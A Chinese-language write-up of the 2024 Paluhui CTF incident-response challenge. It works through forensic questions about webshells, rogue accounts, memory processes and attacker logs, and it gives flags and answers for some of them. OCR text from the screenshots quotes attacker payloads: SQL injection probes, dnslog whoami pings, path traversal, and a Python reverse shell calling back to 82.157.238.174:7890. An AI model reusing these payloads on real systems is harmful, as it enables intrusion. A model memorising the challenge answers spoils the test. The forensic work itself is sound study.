---
title: '2024 帕鲁杯 应急响应 Writeup'
description: '提交:堡垒机的flag标签的值'
pubDate: 2024-10-20
author: 'IHK-1'
tags: ['CTF', '帕鲁杯', '应急响应', '2024']
---

# 应急响应题目
## 1. 签到 
提交:[堡垒机的flag标签的值]

<!-- 这是一张图片，ocr 内容为：更多操作 创建 搜索 值 创建日期 名称 操作 资源数量 FLAG 2024/04/17 15:31:23 BRYEAVI54009/DIZZU4O 更多 更新 共1条 15条/页 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713504427431-71961f56-4b92-428c-b31e-771476027f51.png)

```plain
[BrYeaVj54009rDIZzu4O]
```



2. 提交攻击者第一次登录时间

格式为:[2024/00/00/00:00:00]

```plain
[/data/log/202404_cplog.php]
```



3. 提交攻击者源IP

格式为:[0.0.0.0]



4. 提交攻者使用的cve编号

格式为:[CVE-0000-0000]



5. 提交攻击者留着web服务器上的恶意程序的32位小写md5

格式为:[xxxxxx]



6. 分析恶意程序连接地址和密码

格式为:[md5(地址)-md5(密码)]全小写



7. 提交存在反序列化漏洞的端口

格式为:[md5(端口)]



## 8. 存疑 提交攻击者使用的后门路由地址
格式为:[md5(/api/xxx)]

<!-- 这是一张图片，ocr 内容为：D盾V2.1.7.2[测试版]HTTP://WWW.D99NET.NET D盾 主动防御,默默为你的网站保驾护航! HTTP://WWW.D99NET.NET 扫描结束. 扫描结束 返回 5 检测文件数:4019 发现可疑文件:4 用时:9.92秒 文件(支持拖放目录和扫描) 级别 大小 说明 修改时间 OK JC:LUSERS HK`DESKTOPLLINDEX.PHP (内藏)EVAL后门[参数:$_GET[1.. 6943 2024-04-17 09:21:58 4 EVAL后门[参数:$_POST["SHELL"]]] C:LUSERS￥HKIDESKTOPTHTMLISHELL.PHP 4 2024-04-19 12:44:18 31 已知后门 C:LUSERS`HK&DESKTOP&HTMLLAPI`NIDEWEN.PHP 5 516 2024-04-16 21:37:21 [可疑]REGISTER_SHUTDOWN_FUNC.. C:QUSERS￥HKIDESKTOPTHTMLISOURCEIPLUGINTWITF... 2023-07-27 12:14:48 1424 1 用 选项 记录 工具 查杀 主页 规则 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713530428690-a5c26266-f18e-48fe-9c08-732684664ed8.png)

```plain
/api/nidewen.php
```

## 9. 存疑 提交dnslog反弹域名
格式为:[md5(域名)]

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 192.168.20123 >-192.168.20.123 X 编辑://FLASK/LOG.TXT/LOG.TXT 四用此编码打开 C刷新 三高高 保存 /FLASK/LOG.TXT/LOG.TXT /3  1/13119219.9310322---1S X 入 A11 DNSUP 74 1713119219.957517-----1S 1713119219.985645-----15 75 AA\B 1 OF74 1713119219.9911582- 76 ----LS'AND(SELECT+1)>0WAITFOR/**/DELAY'0:0:0 77 -1S 1713119220.0203605 78 15 1713119220.0422401 1713119220.058964- -LS'AND(SELECT+1)>0WAITFOR/**/DELAY'0:0:2 79 1713119220.0752623 ----LS 80 1713119220.0924747- 7----LS 81 1713119220.1053982 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 82 1713119220.1142778- --1S 83 1713119220.1337497-----1S'/*水/AND/**/DBMS PIPE.RECEIVE MESSAGE('M',0)三'M 84 1713119220.15161 85 - - 1S 1713119220.1698542-----1S 86 87 1713119220.1967244-----1S'/**/AND/**/OBMS PIPE.RECEIVE MESSAGE('0',2)-" - - LS 1713119220.232935- 88 1713119452.2637877- 89 --PINGUSER.WHOAMI`.OVQKHT.DNSLOG.CN 90 1713119452.2999487- PINGUSER.WHOAMI.OVQKHT.DNSLOG.CN -${@VAR_DUMP(MD5(229714183))]; 91 1713119452.3129728- ---PINGUSER.'WHOAMI`.OVQKHT.DNSLOG.CN 92 1713119452.3399234-- 992118679 + 998430305 93 EXPR 94 1713119452.340773-----${919480187+855253040] 95 ---/*1*/{{916792567+947735968]] 1713119452.3417459-- 96 97 1713119452.3701413 --PINGUSER.WHOAMI`.OVQKHT.DNSLOG.CN 1713119452.4266791 98 -VAR_DUMP(MD5(170098104))- 99 1713119452.4423792 --PINGUSER.WHOAMI.OVQKHT.DNSLOG.CN -PINGUSER.`WHOAMI'.OVQKHT.DNSLOG.CN 100 1713119452.448949-- -${881433403+8392978041 101 1713119452.4515889- 1713119452.4642265- 102 --PINGUSER.'WHOAMI'.OVQKHT.DNSLOG.CNLEXPR 947869679 + 910754136 103 1713119452.4656587 ZGTYOHQWRMSPHIXGYPZT 1.1.1.-L.L.L.L..L.L.L.L.L.L.L.L.L.L..L..L..L..L.L.L.L.L..L.L.L.L.L.L.L.L.L.L.L.L.L.L.L..L.L..L.L.L.-L 1713119452.4769828 1A4 SSD(C:) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713529625707-70ec951b-0549-4670-a052-203a02af25b7.png)

```plain
0vqkht.dnslog.cn
[]
```



10. 提交第一次扫描器使用时间

格式为:[2024/00/00/00:00:00]



## 11. 提交攻击者反弹shell使用的语言
格式为:[md5(c++&java)]均为小写

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713528682860-6ab63f3d-dcdc-4772-b9e7-0563d334db19.png?x-oss-process=image%2Fformat%2Cwebp)

```plain
python
[23eeeb4347bdd26bfc6b7ee9a3b755dd]
```

## 12. 提交攻击者反弹shell的ip
格式为:[xxx.xxx.xxx.xxx]

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 192.168.20123 >-192.168.20.123 编辑://FLASK/LOG.TXT/LOG.TXT C刷新 三高亮 食用此编码打开 保存 /FLASK/LOG.TXT/LOG.TXT 1713119550.7626007- 393 /../../WEB-INF/WEB.XML;PING USER.WHOAMI`.OVQKHT.PALU.CN 394 1713119550.7968442 ./../../../WEB-INF/WEB.XML 395 1713119550.813291-- -./../.././WEB-INF/WEB.XML;PING USER.'WHOAMI'.EVQKHT.PALU.CN NT SOCKET,SUBPROCESS,OS:SESOCKET,SOCKET(SOCKET.AF INET,SOCKET,SOCK STREAN):S.CONNECT('8) 396 1713120249.5091295- -IMPORT SO 7890)):QS,DUP2(S,FILENO(); OS,DUP2Y; PTY,SPAUN('SH'):  1):DUP2(S,FILENO();3MPORT PTY; PTY,SPAUN('SH') .157.238.174',7890));G 397 1713120301.6446397----- ---PCNTL EXEC('/USR/BIN/PYTHON',['-C',BASE64 DECODE BGVUBYGPLDIPO2LTCG9YDCBWDHK7IHBEES5ZCGF3BIGIC2GIKQ-*)1); 1713163809.6400366 398 --IP A '+(42257*43980)+ 399 1713163809.6608613- 400 IP A 1713163809.6771863- 401 1713163809.714946- IPA 402 1713163809.7168055- IP A 403 1713163809.7603614 IP A 404 1713163809.7617962- IP A 405 1713163809.7825434 -IP A 406 IP A 1713163809.799396 407 1713163809.814568 IP A 408 1713163809.8280227 -IP A 409 1713163809.839085 IP A 410 1713163809.849398 IPA 411 1713163809.861249 IP A 1713163809.8820546- 412 IP A 413 1713163809.8911572 IPA 414 --${852199571+839988458] 1713163809.9203382 415 1713163809.933895- -/*1*/{{86535477+906475806}] 416 1713163809.9477665- IP A -${@VAR_DUMP(MD5(920635655))]]; 1713163809.9617758 417 418 --IP A 1713163809.9745746- 419 EXPR 912606302 + 994437793 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713528682860-6ab63f3d-dcdc-4772-b9e7-0563d334db19.png)

```plain
82.157.238.174
```

13. 提交攻击者留下的账号

格式为:[xxxxx]



14. 提交攻击者的后门账户密码

格式为:[md5(password)]



15. 提交测试数据条数

格式为[md5(xxx)]



## 16. 请提交攻击者留下的信息
格式为:[xxxx]

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD编辑窗口调试 >-192.168.20.123 192.168.20.123 192.168.20.123 X X 编辑://VAR/LOG/NGINX/HACKTEXT 四用此编码打开 三高高 刷新 B保存 /VAR/LOG/NGINX/HACKTEXT FLAG{HI_PALU_F10G] 1 2 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713531230259-a864f826-549d-4b77-9fac-593002e52c9b.png)

```plain
flag{hi_palu_f10g}
```

## -------------运维服务器---------------
17. 请提交运维服务器上的恶意文件md5小写32

格式为:[xxxx]



18. 提交恶意文件的恶意函数

格式为:[md5(恶意函数)]



19. 请提交攻击者恶意注册的恶意用户条数

格式为:[md5(x)]



20. 请提交对博客系统的第一次扫描时间

格式为:[[2024/00/00/00:00:00]



21. 提交攻击者下载的文件

格式为[xxxx.xxx]



22. 请提交攻击者第一次下载的时间

格式为:[xx/Apr/2024:xx:xx:xx]



## 23. 请提交攻击者留下的冰蝎马的文件名称
格式为:[xxxx]

<!-- 这是一张图片，ocr 内容为：D盾V2.1.7.2[测试版]HTTP://WWW.D99NET.NET X D盾 主动防御,默默为你的网站保驾护航! HTTP://WWW.D99NET.NET 扫描结束. 扫描结束 返回 5 检测文件数:4019 发现可疑文件:4 用时:9.72秒 OK 文件(支持拖放目录和扫描) 大小 级别 说明 修改时间 (内藏)EVAL后门 参数:$_GET[1.. JC:LUSERS HK&DESKTOPLINDEX.PHP 6943 2024-04-17 09:21:58 4 EVEL后门[参数:$_POST["SHELL"]] C:IUSERSHKIDESKTOP HTMLISHELL.PHP 2024-04-19 12:44:18 31 4 C:LUSERS&HKIDESKTOPIHTMLLAPIINIDEWEN.PHP 已知后门 5 2024-04-16 21:37:21 516 JC:IUSERSTHKIDESKTOP HTMLISOURCEIPLUGINIWITF... [可疑]REGISTER_SHUTDOWN_FUNC... 2023-07-27 12:14:48 1424 1 用 选项 工具 记录 查杀 主页 规则 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713520794684-a1cc5997-c8fb-4854-b382-fc8c887db106.png)

```plain
[nidewen.php]
```

24. 提交冰蝎的链接密码

格式为:[xxx]



## 25. 提交办公区存在的恶意用户名
格式为:[xxx]

<!-- 这是一张图片，ocr 内容为：其他用户 其他用户 将其他人添加到这台电脑 HACKER 本地帐户 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713508491854-c4b07ada-77f7-4c67-98af-6481664ecf5f.png)

```plain
[hacker]
```

## 26. 提交恶意用户密码到期时间
格式为:[xxxx]

<!-- 这是一张图片，ocr 内容为：管理员:C:\WINDOWS|SYSTEM32\CMD.EXE LUSE USERS\ADMINISTRATOR>NET USER HACKER 食用全注 名 户名释 HACKER 角户的注释 (系统默认值) 国家/地区代码 000 帐户启思 双禾 账户到期 上次设置密码 2024/4/16 21:40:37 密码到期 2024/5/28 21:40:37 密码可更改 2024/4/16 21:40:37 需要密码 YES 用户可以更改密码 YES 允许的工作站 A11 登录脚本 用户配置文件 主目录 从不 上次登录 可允许的登录小时数 A11 本地组成员 *USERS 全局组成员 *NONE 命令成功完成. -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713508538330-0b8bd800-f678-473b-a491-c1006d45831d.png)

```plain
[2024/5/28/21:40:37]
```

## 27. 请对办公区留存的镜像取证并指出内存疑似恶意进程
格式为:[xxxx]

<!-- 这是一张图片，ocr 内容为：OXFFFFFA800E902440 01 2023-05-07 12:52:06 UTC+0000 40 SEARCHFILTERHO 2864 100 2884 2072 171 2023-05-07 12:52:17 UTC+0000 644 10 JATTITIAOUVECAOLAU ULLIISC. 12 XFFFFFA800EC59780 ,HACK.EX 2552 2023-05-07 12:53:02  UTC+000 2120 AYFTTT-000000 HO,70 CONH 2 0 2023-05-07 12:53:02 UTC+000 420 2456 2120 2480 OXFFFFFA800DC2E820 CMD.EXE 0  2023-05-07 12:53:02  UTC+000 17 02023-05-07 12:53:02 UTC+0000 OXFFFFFA800ED29390 TIMEOUT.EXE 2480 2936 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713515560946-d6cda682-3f72-4570-aff5-b8473044f057.png)

```plain
执行：pslist
[.hack.ex]
```

## 28. 请指出该员工使用的公司OA平台的密码
格式为:[xxxx]

```plain
执行：iehistory
admin@file:///C:/Users/admin/Desktop/password.txt
```

<!-- 这是一张图片，ocr 内容为：URL:HTTP://TEST.OA.COM/LOGIN.HTML USERNAME:LIULING PASSWORD:LIULING7541 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713516607157-2c2a1a5c-f213-45fc-8d11-57b74b4554ae.png)

```plain
[liuling7541]
```

## 29. 攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么
格式为:[xxxx]

<!-- 这是一张图片，ocr 内容为：MAGNET AXIOM EXAMINE V7.8.38310-AXIOM -APR 19 2024 164113 进程帮助(&H) 文件(&F) 肤色 关键字列表 证据 配置文件 部分结果 标签和简注 过滤器 亮级 键入挖家词. 日期和时间 使用痕迹 内容类型 转车 证据(5) 列视网 使用痘迹 C:\WINDOWS\PLA\H4CK3D! 标签,备注和配置文件 媒体 120 文本 窗口站 格式 数据 会话.... RAW.RAW 1 CAWINDBWS\PLAVHACK3D! 4300 3A00 5C 00 69 00 6E 00 64 00 64 00 77... CF UNICODETEXT 操作系统 230 WINSTAO CF.TEXT 1 详情 30 2 UNK 文件 1 CF.TEXT WINSTAO WINDOWS事件日志 155 1 0X1B01A5L WINSTA0 使用痕迹信息 1 WINDOWS事件日志-防火墙事件 1 04 08 00 00 C\WINDOWS\PLA\H4CK3D! 文本 36 WINDOWS事件日志-服务事件 数据 4300 3A 00 5 00 5700 69 00 64 00 64 00 1 WINDOWS事件日志-系统事件 6F00770073005C0050004C004C004100 5C00680034006300660066003300 3 WINDOWS事件日志`用户事件 21000000 WINDOWS事件日志-用户 PNP 事件 会话ID 窗口站 WINSTA0 内存 29,940 格式 CF UNICODETEXT 效贴板(CLIPBOARD) 句柄ID 0X4C0397 日命令历史记录(CMDSCAN) 对象ID 0XFFFFFF900C1C19830 2,407 口动态加载库(DILLIST) 类型 男贴板(CLIPBOARD) 项目ID10203 1,665 文件(FILESCAN) 55 陷滋的进程(PSXVIEW) 证据信息 152 隐蔽/到余模块(MODSCAN) 源 54 隐蔽/路上的进程(PSSCAN) 恢复方法 已解析 映像信息(IMAGEINFO) 已加除源 2.351 位爱 LDR 模块(IDRMODULES) N/A 证据编号 152 加载的内核模块(MODULES) 8 恶意软件查找工具(MALFIND) 49 网络信息(NETSCAN) 打开的句柄(HANDLES) 12,634 EX 富尔911000 中 搜索 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713516918351-68c3e729-da3a-46e2-a4ce-6518e2579084.png)

```plain
[h4ck3d!]
```

## 30. 请提交该计算机中记录的重要联系人的家庭住址
格式为:[xxxxx]

```plain
/admin/contacts/王总.contact
```

<!-- 这是一张图片，ocr 内容为：王总.CONTACT OUT.TXT 查看 编辑 文件 X O /ADMINLCONTACTS <?XMLVERSION-"1.0'ENCODING-"UTF-8"? XMLNS:MSP2P二"HTTP://SCHEMAS.MICROSOFT.COM/CONTACT/EXTENDED/MSP2P"> <C:CREATIONDATE>2023-05-07T12:26:32Z</C:CREATIONDATE> <CIEXTENDED XSIINIL-'TRUE"/> USERTILE</C:LABEL></CLABELCOLLECTION></C:PHOTO></C:PHOTOCOLLECTION> /CCONTACT> WINDOWS (CRLF) UTF-8 行5,列11544,060个字符 100% -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713518129360-c5c146c8-9904-4cef-8618-be3ea8951a66.png)

```plain
[秋水省雁荡市碧波区千屿山庄1号]
```

## 31. 请提交近源靶机上的恶意文件哈希
格式为:[xxx]

<!-- 这是一张图片，ocr 内容为：VMWARE WORKSTATION PC02 中 选项卡D帮助(H) 虚拟机(M) 编辑(E) 查看(V) 文件() X 南 X PC01 WEBSERVER WAF ZABBIX SERVER KALINUX-2022.3-.....X PC02 X MYSGL02 MYSQLO1 JUMPSERVER 在此处键入内容进行搜索 我的计算机 KALI-LINUX-2023.3-VMWARE-AMD64 回收站 KALI-LINUX-2022.3-VMWARE-AMD64 (剑龙/PYTHON3.6) 口 X | 文件资源管理器 WINDOWS 11 X64 X 启动 JUMPSERVER 管理 MYSGL01 查看 共享 应用程序工具 文件 主页 MYSQL02 MICROSOFT>WINDOWS  [开始]菜单>  启动 PC01 搜索.启动 个 PC02 名称 大小 修改日期 类型 WAF 快速访问 WEBSERVER 应用程序 2024/4/178:35 14 KB ARTIFACTEXE 桌面 ZABBIX  SERVER 压缩(ZIPPED)文件... 2024/4/178:36 7KB ARTIFACT.ZIP 下载 PICTURES 此电脑 网络 8 2个项目 选中1个项目14.0KB 17:22 2024/4/19 小克 要将输入定向到该点拟机,请将良标指针移入其中或按CTL+G. -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713518567094-d893250a-17bf-4c46-84a5-22a6f8ef9efa.png)

```plain
[a7fcd0b15a080167c4c2f05063802a6e]
```



32. 提交恶意程序的外联地址

格式为:[xxxxx]

<!-- 这是一张图片，ocr 内容为：IDA-ARTIFACT.EXE C:LUSERSTHKIDESKTOPLARTIFACT.EXE 文件编辑跳转搜素视图调试器 帮助 BINDIFF 窗口 选项 LUMINA A 无调试器 指令 常规函数 库函数 外部符号 LUMINA 函数 数据 未知 PSEUDOCODE-A 字串 HEX VI EW-1 IDA VI EW-A FUNETIONS X SUB 401840() INT 段 函数名称 23456 DWORD TICKCOUNT;// EAX SUB_4U1/13 TEXT SUB_401732 TEXT 天下 SUB 4017E2 TEXT TICKCOUNT GETTICKCOUNT(); S手手手手手手手 SUB 401840 SPRINTF(BUFFER,  92, 92, 117, 117,             92, 92, 92, 92,         117, 117,                      TLSCALLBACK 1 TEXCT CREATETHREAD(0, 0, SUB_401713, 0, 0, 0); TLSCALLBACK O TEXT 8 RETURN SUB_4017E2(0); SUB_401AEO TEXT 91 SUB_401AF0 TEXT SUB 401B00 TEXT SUB 401B10 TEXT SUB 401BD0 ,TEXT -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713518958574-6caa82b9-3e5a-49e2-94d1-7e6cf50075ae.png)

33. 提交攻击者使用内网扫描工具的哈希

格式为:[xxxx]



34. 请提交攻击者在站点上留下的后门密码

格式为:[xxxx]



## 35. 请提交攻击者在数据库留下的信息
格式为:[xxxx]

<!-- 这是一张图片，ocr 内容为：MYSQ102-VMWARE WORKSTALION 中国蚁剑 文件() 帮助(H) 选项卡() 包装 (V)_至 应该机(M) 窗口调试 192.168.20.123 192.168.20.123 X WAF X 在此处避入内容进行搜素 1 编码:/VAR/WWW/HTML/CONFIG/CONFIG_UCENTER.PHP PRE_UCENTER SQICACHE PRE.UCENTER.TAGS /VAR/WWW/HTML/CONFIG/CONFIG_UCENTER.PHP PRE_UCENTER_VARS (KAFFINUX-2023.3-VMWARE-AMD64 K?PHP 291 ROWS IN SET (0.004 SEC) KALI-LINUX-2022.3-WMWARE-AMD64(阅发(PYTHON3.6) WINDOWS 11 X64 MYSAL [ULTRAX]> SELECT *FROM ULTRAX; DEFINE('UC CONNECT', MYSQ1); ERROR 1146 (42S02): TABLE 'ULTRAX.ULTRAX' DOESN'T EXIST DEFINE('UC STANDALONE*,0); MYSQL01 MYSQL [ULTRAX]> SSELECT *FROM PRE_UCENTER_VARS; LERRON 1064 (42000): YOU HAVE AN ERROR IN YOUR SOL SUNTAKI CHECK THE MENUEL THAT CORRESPANDS TO HOUN MYSQL02 DEFINE('UC DBHOST',192.168.20.51); IMJSQL SERVER VENSLON FOR THE RLGHT SUNTAX TO USE NEAR 'SSELECT & FROM PROM PRE-UCENTER.VERS' AT INE  DEFINE('UC_DBUSER','ROOT); MYSQL [ULTRAX]> SELECT *FROM NOTELIST: DEFINE('UC_DBPW', 'MYSQL1234'); ERROR 1146(42S02):TABLE 'UITRAX.NOTELIST' DOESN'T EXIST BIT DEFINE('UC_DBNAME',ULTRAX); MYSQL LULTRAX]> SELECT *FROM PRE_UCENTER NOTELIST: DEFINE('UC_DBCHARSET','UTF8MB4); DEFINE('UC_DBTABLEPRE',"ULTRAX`.PRE_UCENTER_'); OPERATION I CLOSED I TOTELNUM I SUCCEEDNUM I GETDATA NOTEID POSTDATA L DATELI DEFINE('UC_DBCONNECT',0); PRI APP1 DEFFOOT UR AVTPATW: USERNAME-ADMIN&PASSWORD- 171327 735 DEFINE('UC_CHARSET','UTF-8'); DEFINE('UC_KEY","FAT9TBXFS8OAD6VELAL9J1YEEAED14N7VDI4A9P973QFC6I DEFINE('UC_API','HTTP://192.168.20.121/UC_SERVERYER); ROW IN SET (0.043 SEC) DEFINE(`UC_APPID,11); 2 DEFINE('UC_IP',''); MYSQL [ULTRAX]> SELECT *FROM PRE_UCENTER_VARS; DEFINE('UC_PPP',20); 公 NAFNG VALUE F LAG (HACK_PALU] 000 NOTEEXISTS NOTEEXISTS1 3 ROWS IN SET (0.007 SEC) MYSQL [UITRAX]> 要将输入定向到脑点似机,请在点膜肌内部单击或接CTL+G, -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1713520551184-f9fabfca-e8b0-4c29-b966-5113c7089777.png)

```plain
flag{hack_palu}
```

36. 提交攻击者在监控服务器上留下的dcnlog地址

格式为:[xxx.xx.xx]



37. 提交监控服务器上恶意用户的上一次登录时间

格式为:[xx/xx/xx/xx:xx:xx]



38. 提交监控服务器上遗留的反弹shell地址和端口

格式为:[xxxx:xx]



39. 提交恶意钓鱼文件的哈希

格式为:[xxxx]



40. 提交恶意文件外联IP

格式为:[xxx]



41. 提交被恶意文件钓鱼使用者的姓名

格式为:[xxx]



42. 提交攻击者留下的信息

格式为:[xxxx]



43. 提交恶意用户数量

格式为:[md5(xxxx)]



请提交员工集体使用的密码

格式为:[xxxx]



44. 请提交员工集体使用的密码

格式为:[xxxx]



45. 提交加密文件的哈希

格式为:[xxxx]



46. 提交被攻击者加密的内容明文

格式为:[xxxx]



47. 请提交符合基线标准的服务器数量

格式为:[md5(xx)]



48. 提交办公区的恶意文件哈希

格式为:[xxx]



49. 提交恶意回连端口

格式为:[xxx]



50. 提交恶意程序中的falg

格式为:[xxx]



51. 提交恶意文件中的search_for_text内容

格式为:[xxxx]



52. 提交web服务器上攻击者修改后的root密码

格式为:[xxxx]

